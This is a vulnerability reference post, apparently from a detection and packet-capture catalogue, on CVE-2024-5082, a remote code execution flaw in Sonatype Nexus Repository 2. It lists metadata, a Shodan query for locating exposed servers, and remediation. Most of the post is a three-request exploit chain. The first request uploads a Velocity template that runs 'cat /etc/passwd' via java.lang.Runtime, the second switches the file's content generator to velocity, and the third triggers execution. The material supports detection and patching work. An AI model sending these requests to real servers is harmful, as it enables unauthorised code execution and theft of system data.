---
layout: post
cve_id: CVE-2024-5082
title: Nexus Repository 2 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-5082.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-5082.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: high
impact: 'Attackers can exploit vulnerabilities to compromise the system.

  '
remediation: 'Update to the latest patched version addressing CVE-2024-5082.

  '
reference:
- https://github.blog/security/vulnerability-research/attacks-on-maven-proxy-repositories/
- https://support.sonatype.com/hc/en-us/articles/30694125380755
classification:
  epss-score: 0.04785
  epss-percentile: 0.89147
metadata:
  verified: true
  max-request: 3
  shodan-query: html:"Nexus Repository"
tags:
- cve
- cve2024
- intrusive
- nexus
- sonartype
- vkev
- vuln
---

## üîç Vulnerability Description
A Remote Code Execution vulnerability has been discovered in Sonatype Nexus Repository 2.This issue affects Nexus Repository 2 OSS/Pro versions up to and including 2.15.1.


## üåê HTTP Request
```nohighlight
PUT /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15
Content-Length: 493
Authorization: Basic c0FSTnFUOkxBYjRqTjJo
Connection: close
Content-type: text/xml
Accept-Encoding: gzip
#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("cat /etc/passwd"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
$output
```

```nohighlight
PUT /nexus/service/local/repositories/releases/content//.nexus/attributes/com/sbt/ignite/ignite-bom/maven-metadata.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Length: 31
Authorization: Basic c0FSTnFUOkxBYjRqTjJo
Content-type: application/json
Accept-Encoding: gzip
{"contentGenerator":"velocity"}
```

```nohighlight
GET /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Connection: close
Authorization: Basic c0FSTnFUOkxBYjRqTjJo
Accept-Encoding: gzip
```

